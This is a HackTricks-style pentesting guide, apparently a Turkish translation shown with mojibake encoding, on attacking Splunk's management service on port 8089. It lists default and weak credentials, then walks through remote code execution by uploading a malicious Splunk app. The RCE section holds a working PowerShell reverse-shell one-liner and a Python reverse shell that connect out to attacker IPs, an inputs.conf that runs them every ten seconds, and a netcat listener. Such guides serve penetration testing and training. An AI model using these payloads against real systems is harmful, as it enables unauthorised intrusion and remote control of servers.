# 8089 - Pentesting Splunkd

{% hint style="success" %}
Learn & practice AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Learn & practice GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
* **Join the** ğŸ’¬ [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** ğŸ¦ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}

## **Temel Bilgiler**

Splunk, **veri toplama, analiz etme ve gÃ¶rselleÅŸtirme** konusunda kritik bir rol oynayan bir **log analitik aracÄ±**dÄ±r. BaÅŸlangÄ±Ã§ta bir **SIEM (GÃ¼venlik Bilgisi ve Olay YÃ¶netimi)** aracÄ± olarak hizmet vermek amacÄ±yla tasarlanmamÄ±ÅŸ olsa da, **gÃ¼venlik izleme** ve **iÅŸ analitiÄŸi** alanÄ±nda popÃ¼lerlik kazanmÄ±ÅŸtÄ±r.

Splunk daÄŸÄ±tÄ±mlarÄ± genellikle **hassas verileri** depolamak iÃ§in kullanÄ±lÄ±r ve sistemin ele geÃ§irilmesi durumunda potansiyel saldÄ±rganlar iÃ§in **deÄŸerli bir bilgi kaynaÄŸÄ±** olabilir. **VarsayÄ±lan port:** 8089
```
PORT     STATE SERVICE VERSION
8089/tcp open  http    Splunkd httpd
```
{% hint style="info" %}
**Splunk web sunucusu varsayÄ±lan olarak 8000 numaralÄ± portta Ã§alÄ±ÅŸÄ±r**.
{% endhint %}

## Enumeration

### Ãœcretsiz Versiyon

Splunk Enterprise denemesi **60 gÃ¼n sonra Ã¼cretsiz versiyona dÃ¶nÃ¼ÅŸÃ¼r**, bu da **kimlik doÄŸrulama gerektirmez**. Sistem yÃ¶neticilerinin Splunk'Ä±n deneme sÃ¼rÃ¼mÃ¼nÃ¼ test etmek iÃ§in kurmasÄ± ve bunun **sonrasÄ±nda unutulmasÄ±** yaygÄ±n bir durumdur. Bu, kimlik doÄŸrulama gerektirmeyen Ã¼cretsiz versiyona otomatik olarak dÃ¶nÃ¼ÅŸecektir ve bu da ortamda bir gÃ¼venlik aÃ§Ä±ÄŸÄ± oluÅŸturur. BazÄ± organizasyonlar, kullanÄ±cÄ±/rol yÃ¶netiminin olmamasÄ±yla ilgili sonuÃ§larÄ± tam olarak anlamadan bÃ¼tÃ§e kÄ±sÄ±tlamalarÄ± nedeniyle Ã¼cretsiz versiyonu tercih edebilir.

### VarsayÄ±lan Kimlik Bilgileri

Eski Splunk sÃ¼rÃ¼mlerinde varsayÄ±lan kimlik bilgileri **`admin:changeme`** olup, bu bilgiler giriÅŸ sayfasÄ±nda rahatlÄ±kla gÃ¶rÃ¼ntÃ¼lenir.\
Ancak, **Splunk'Ä±n en son sÃ¼rÃ¼mÃ¼** **kurulum sÃ¼recinde** **kimlik bilgilerini** ayarlar. VarsayÄ±lan kimlik bilgileri Ã§alÄ±ÅŸmazsa, `admin`, `Welcome`, `Welcome1`, `Password123` gibi yaygÄ±n zayÄ±f ÅŸifreleri kontrol etmekte fayda vardÄ±r.

### Bilgi Edinme

Splunk'a giriÅŸ yaptÄ±ktan sonra, **verileri gÃ¶zden geÃ§irebilir**, **raporlar** Ã§alÄ±ÅŸtÄ±rabilir, **gÃ¶sterge panelleri** oluÅŸturabilir, Splunkbase kÃ¼tÃ¼phanesinden **uygulamalar** yÃ¼kleyebilir ve Ã¶zel uygulamalar yÃ¼kleyebilirsiniz.\
AyrÄ±ca kod Ã§alÄ±ÅŸtÄ±rabilirsiniz: Splunk, sunucu tarafÄ± Django uygulamalarÄ±, REST uÃ§ noktalarÄ±, betik girdi ve uyarÄ± betikleri gibi **kod Ã§alÄ±ÅŸtÄ±rmanÄ±n** birÃ§ok yoluna sahiptir. Bir Splunk sunucusunda uzaktan kod yÃ¼rÃ¼tmenin yaygÄ±n bir yÃ¶ntemi, betik girdi kullanmaktÄ±r.

AyrÄ±ca, Splunk Windows veya Linux ana bilgisayarlarÄ±nda kurulabileceÄŸinden, Bash, PowerShell veya Batch betiklerini Ã§alÄ±ÅŸtÄ±rmak iÃ§in betik girdileri oluÅŸturulabilir.

### Shodan

* `Splunk build`

## RCE

### Ã–zel Uygulama OluÅŸturma

Ã–zel bir uygulama **Python, Batch, Bash veya PowerShell betikleri** Ã§alÄ±ÅŸtÄ±rabilir.\
**Splunk'Ä±n Python ile yÃ¼klÃ¼ geldiÄŸini** unutmayÄ±n, bu nedenle **Windows** sistemlerinde bile python kodu Ã§alÄ±ÅŸtÄ±rabileceksiniz.

Bize yardÄ±mcÄ± olmasÄ± iÃ§in [**bu**](https://github.com/0xjpuff/reverse\_shell\_splunk) Splunk paketini kullanabilirsiniz. Bu repo iÃ§indeki **`bin`** dizini, [Python](https://github.com/0xjpuff/reverse\_shell\_splunk/blob/master/reverse\_shell\_splunk/bin/rev.py) ve [PowerShell](https://github.com/0xjpuff/reverse\_shell\_splunk/blob/master/reverse\_shell\_splunk/bin/run.ps1) iÃ§in Ã¶rnekler iÃ§ermektedir. Bunu adÄ±m adÄ±m inceleyelim.

Bunu baÅŸarmak iÃ§in, Ã¶nce aÅŸaÄŸÄ±daki dizin yapÄ±sÄ±nÄ± kullanarak Ã¶zel bir Splunk uygulamasÄ± oluÅŸturmamÄ±z gerekiyor:
```shell-session
tree splunk_shell/

splunk_shell/
â”œâ”€â”€ bin
â””â”€â”€ default
```
**`bin`** dizini, **Ã§alÄ±ÅŸtÄ±rmayÄ± planladÄ±ÄŸÄ±mÄ±z** herhangi bir **script** iÃ§erecektir (bu durumda, bir **PowerShell** ters shell), ve varsayÄ±lan dizin `inputs.conf` dosyamÄ±zÄ± iÃ§erecektir. Ters shell'imiz bir **PowerShell one-liner** olacak:
```powershell
$client = New-Object System.Net.Sockets.TCPClient('10.10.10.10',443);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2  = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close(
```
[inputs.conf](https://docs.splunk.com/Documentation/Splunk/latest/Admin/Inputsconf) dosyasÄ± Splunk'a **hangi scriptin Ã§alÄ±ÅŸtÄ±rÄ±lacaÄŸÄ±nÄ±** ve diÄŸer koÅŸullarÄ± belirtir. Burada uygulamayÄ± etkin olarak ayarlÄ±yoruz ve Splunk'a scripti her 10 saniyede bir Ã§alÄ±ÅŸtÄ±rmasÄ±nÄ± sÃ¶ylÃ¼yoruz. AralÄ±k her zaman saniye cinsindendir ve girdi (script) yalnÄ±zca bu ayar mevcutsa Ã§alÄ±ÅŸacaktÄ±r.
```shell-session
cat inputs.conf

[script://./bin/rev.py]
disabled = 0
interval = 10
sourcetype = shell

[script://.\bin\run.bat]
disabled = 0
sourcetype = shell
interval = 10
```
`.bat` dosyasÄ±na ihtiyacÄ±mÄ±z var, bu dosya uygulama daÄŸÄ±tÄ±ldÄ±ÄŸÄ±nda Ã§alÄ±ÅŸacak ve PowerShell tek satÄ±rlÄ±k komutunu yÃ¼rÃ¼tecek.

Sonraki adÄ±m, `Install app from file` seÃ§eneÄŸini seÃ§mek ve uygulamayÄ± yÃ¼klemektir.

<figure><img src="../.gitbook/assets/image (668).png" alt=""><figcaption></figcaption></figure>

KÃ¶tÃ¼ niyetli Ã¶zel uygulamayÄ± yÃ¼klemeden Ã¶nce, Netcat veya [socat](https://linux.die.net/man/1/socat) kullanarak bir dinleyici baÅŸlatalÄ±m.
```shell-session
sudo nc -lnvp 443

listening on [any] 443 ...
```
`Upload app` sayfasÄ±nda, gÃ¶z at'a tÄ±klayÄ±n, daha Ã¶nce oluÅŸturduÄŸumuz tarball'Ä± seÃ§in ve `Upload`'a tÄ±klayÄ±n. **UygulamayÄ± yÃ¼klediÄŸimiz anda**, uygulamanÄ±n durumu otomatik olarak `Enabled` olarak deÄŸiÅŸeceÄŸi iÃ§in bir **ters shell alÄ±nÄ±r**.

#### Linux

EÄŸer bir **Linux host** ile uÄŸraÅŸÄ±yorsak, tarball'Ä± oluÅŸturmadan ve Ã¶zel kÃ¶tÃ¼ amaÃ§lÄ± uygulamayÄ± yÃ¼klemeden Ã¶nce **`rev.py` Python betiÄŸini** **dÃ¼zenlememiz** gerekecektir. SÃ¼recin geri kalanÄ± aynÄ± kalacak ve Netcat dinleyicimizde bir ters shell baÄŸlantÄ±sÄ± alacaÄŸÄ±z ve yarÄ±ÅŸa baÅŸlayacaÄŸÄ±z.
```python
import sys,socket,os,pty

ip="10.10.14.15"
port="443"
s=socket.socket()
s.connect((ip,int(port)))
[os.dup2(s.fileno(),fd) for fd in (0,1,2)]
pty.spawn('/bin/bash')
```
### RCE & Yetki YÃ¼kseltme

AÅŸaÄŸÄ±daki sayfada bu hizmetin nasÄ±l kÃ¶tÃ¼ye kullanÄ±labileceÄŸine dair bir aÃ§Ä±klama bulabilirsiniz, yetkileri yÃ¼kseltmek ve kalÄ±cÄ±lÄ±k elde etmek iÃ§in:

{% content-ref url="../linux-hardening/privilege-escalation/splunk-lpe-and-persistence.md" %}
[splunk-lpe-and-persistence.md](../linux-hardening/privilege-escalation/splunk-lpe-and-persistence.md)
{% endcontent-ref %}

## Referanslar

* [https://academy.hackthebox.com/module/113/section/1213](https://academy.hackthebox.com/module/113/section/1213)

{% hint style="success" %}
AWS Hacking'i Ã¶ÄŸrenin ve pratik yapÄ±n:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
GCP Hacking'i Ã¶ÄŸrenin ve pratik yapÄ±n: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>HackTricks'i Destekleyin</summary>

* [**abonelik planlarÄ±nÄ±**](https://github.com/sponsors/carlospolop) kontrol edin!
* **ğŸ’¬ [**Discord grubuna**](https://discord.gg/hRep4RUj7f) veya [**telegram grubuna**](https://t.me/peass) katÄ±lÄ±n ya da **Twitter'da** ğŸ¦ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**'i takip edin.**
* **Hacking ipuÃ§larÄ±nÄ± paylaÅŸmak iÃ§in [**HackTricks**](https://github.com/carlospolop/hacktricks) ve [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github reposuna PR gÃ¶nderin.**

</details>
{% endhint %}
